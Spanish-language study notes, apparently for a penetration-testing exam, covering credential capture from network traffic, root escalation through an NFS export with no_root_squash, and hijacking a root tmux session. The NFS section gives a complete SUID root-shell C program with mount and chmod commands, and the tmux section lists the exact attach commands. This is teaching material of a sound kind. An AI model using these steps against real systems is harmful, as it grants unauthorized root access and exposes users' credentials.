
## 1. Captura pasiva de tráfico

### ¿En qué consiste?

Consiste en capturar y analizar el tráfico de red para encontrar información sensible que podamos utilizar para acceder a otros servicios o escalar privilegios.

Si un servicio transmite credenciales sin cifrar, podríamos recuperar usuarios y contraseñas directamente del tráfico.

También podemos encontrar hashes de autenticación que permitan realizar ataques offline.

### Herramientas

- `tcpdump`: captura paquetes de red.
    
- `net-creds`: ayuda a extraer credenciales e información sensible.
    
- `PCredz`: analiza capturas para identificar credenciales y datos de autenticación.
    

### Procedimiento

1. Comprobar si tenemos permisos para capturar tráfico.
    
2. Capturar el tráfico de red relevante.
    
3. Analizarlo con herramientas como `net-creds` o `PCredz`.
    
4. Buscar credenciales, hashes u otra información útil.
    
5. Comprobar si las credenciales encontradas permiten acceder a otros servicios.
    

### ¿Qué podemos encontrar?

- Usuarios y contraseñas en texto plano.
    
- Credenciales de servicios como FTP, POP, IMAP, Telnet, SMTP o HTTP, si no están protegidos adecuadamente.
    
- Hashes Net-NTLMv2, SMBv2 o Kerberos susceptibles de determinados ataques offline.
    
- Cadenas de comunidad SNMP y otros datos sensibles.
    

**Idea clave:** capturar tráfico puede proporcionarnos credenciales que después podamos utilizar para conseguir acceso a otros sistemas o cuentas.

> Tener `tcpdump` instalado no significa que podamos capturar tráfico: necesitamos los permisos adecuados. Además, el tráfico cifrado no suele permitir recuperar directamente las credenciales.

## 2. Privilegios débiles en NFS

### ¿En qué consiste?

NFS (Network File System) permite compartir archivos y directorios entre sistemas Linux/Unix a través de la red.

Utiliza normalmente el puerto `2049` TCP/UDP.

Una configuración insegura puede permitir que un usuario con acceso al recurso compartido escriba archivos con privilegios que no debería tener.

### 2.1. Enumerar recursos compartidos

```
showmount -e IP
```

Muestra los directorios exportados por el servidor NFS.

Ejemplo:

```
Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

Esto indica que el servidor exporta `/tmp` y `/var/nfs/general`.

El asterisco indica que la exportación admite clientes de cualquier dirección, sujeto a las demás restricciones configuradas.

Para revisar la configuración desde el servidor:

```
cat /etc/exports
```

### 2.2. Opciones importantes

| Opción           | Significado                                                                             |
| ---------------- | --------------------------------------------------------------------------------------- |
| `rw`             | Permite leer y escribir.                                                                |
| `ro`             | Permite únicamente leer.                                                                |
| `root_squash`    | Convierte las operaciones del root remoto en operaciones de un usuario sin privilegios. |
| `no_root_squash` | No aplica esa conversión al root remoto.                                                |

Ejemplo de configuración vulnerable:

```
/tmp *(rw,no_root_squash)
```

- `rw`: permite escribir en el recurso.
    
- `no_root_squash`: permite que las operaciones del root del cliente conserven la identidad de root en el recurso compartido, si se cumplen las demás condiciones.
    

### 2.3. ¿Cómo se aprovecha `no_root_squash`?

**La idea es utilizar el acceso root de nuestra máquina atacante para crear un archivo privilegiado en un directorio compartido del servidor.**

No estamos intentando escalar privilegios en nuestra máquina atacante: queremos conseguir root en el servidor NFS.

#### Paso 1. Crear un binario

Código `shell.c`:

```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

Este programa intenta establecer UID y GID a `0` y ejecutar Bash.

Compilarlo:

```
gcc shell.c -o shell
```

#### Paso 2. Montar el recurso NFS

Desde la máquina atacante:

```
sudo mount -t nfs IP:/tmp /mnt
```

Ahora podemos acceder al recurso compartido a través de `/mnt`.

**Importante:** ser root en la máquina atacante permite realizar el montaje, pero no significa que tengamos root en el servidor.

#### Paso 3. Copiar el binario y activar SUID

```
cp shell /mnt/
chmod u+s /mnt/shell
```

Si la configuración lo permite, el archivo puede quedar propiedad de root y conservar el bit SUID.

Ejemplo de permisos:

```
-rwsr-xr-x 1 root root 16712 shell
```

La `s` indica que el bit SUID está establecido para el propietario.

#### Paso 4. Ejecutar el binario en el servidor

Desde la sesión del usuario de bajos privilegios en el servidor:

```
./shell
```

Si se cumplen todas las condiciones, podemos obtener una shell de root.

### ¿Por qué funciona?

1. Somos root en la máquina atacante.
    
2. El servidor NFS permite escribir en un directorio compartido.
    
3. `no_root_squash` permite conservar la identidad de root en las operaciones realizadas desde el cliente.
    
4. El binario queda con propietario root y SUID.
    
5. Un usuario sin privilegios puede ejecutar el binario en el servidor y aprovechar esos permisos.
    

**Condiciones necesarias:** recurso con escritura, `no_root_squash`, posibilidad de crear el binario con los permisos correctos y ejecución permitida en el recurso.

## 3. Secuestro de sesiones de Tmux

### ¿En qué consiste?

`tmux` permite mantener sesiones de terminal activas incluso después de desconectarnos de ellas.

Un usuario privilegiado puede dejar una sesión funcionando como root. Si los permisos de su socket son débiles, otro usuario podría conectarse a esa sesión y utilizar sus privilegios.

### 3.1. Buscar sesiones activas

```
ps aux | grep tmux
```

Ejemplo:

```
root 4806 ... tmux -S /shareds new -s debugsess
```

Esto indica que hay una sesión de tmux ejecutándose como root y utilizando `/shareds` como socket.

### 3.2. Comprobar los permisos del socket

```
ls -la /shareds
```

Ejemplo:

```
srw-rw---- 1 root devs 0 Sep 1 06:27 /shareds
```

El socket pertenece a `root:devs` y el grupo tiene permisos de lectura y escritura.

### 3.3. Comprobar nuestros grupos

```
id
```

Si pertenecemos al grupo `devs`, podríamos tener permisos para conectarnos al socket.

### 3.4. Conectarnos a la sesión

```
tmux -S /shareds
```

Si conseguimos acceder a una sesión de root, los comandos que ejecutemos dentro de ella tendrán los privilegios de esa sesión.

### ¿Por qué funciona?

1. Root mantiene una sesión de tmux activa.
    
2. La sesión utiliza un socket accesible para nuestro usuario.
    
3. Tenemos permisos para conectarnos al socket.
    
4. Entramos en la sesión privilegiada.
    
5. Podemos ejecutar comandos con los privilegios de la sesión.
    

**Idea clave:** no necesariamente estamos explotando una vulnerabilidad del programa tmux. Estamos aprovechando una configuración insegura de los permisos de acceso a una sesión privilegiada.

## 4. Chuleta rápida para la enumeración

|Técnica|Qué buscar|Comando o indicador|
|---|---|---|
|Captura de tráfico|Credenciales y datos sensibles|`tcpdump`|
|NFS|Directorios compartidos|`showmount -e IP`|
|Configuración NFS|Recursos con escritura y `no_root_squash`|`cat /etc/exports`|
|Tmux|Sesiones ejecutándose como root|`ps aux \| grep tmux`|
|Tmux|Socket accesible para nuestro usuario|`ls -la /shareds`|
|Tmux|Grupos a los que pertenecemos|`id`|

## 5. Qué debes recordar para el examen

- **Captura de tráfico:** busca credenciales y hashes que puedan permitir acceder a otros servicios.
    
- **NFS:** comprueba los recursos exportados y busca la combinación de escritura (`rw`) y `no_root_squash`.
    
- **Tmux:** busca sesiones privilegiadas y comprueba si puedes acceder a sus sockets.
    
- **SUID:** permite que un ejecutable se ejecute con los privilegios de su propietario, si las condiciones del sistema lo permiten.
    
- **Separación de máquinas:** ser root en Kali no significa ser root en el objetivo. La escalada debe conseguirse en la máquina donde quieres obtener los privilegios.
    
- **Enumerar no es explotar:** descubrir un recurso NFS no implica que sea vulnerable; primero hay que comprobar sus permisos y configuración.
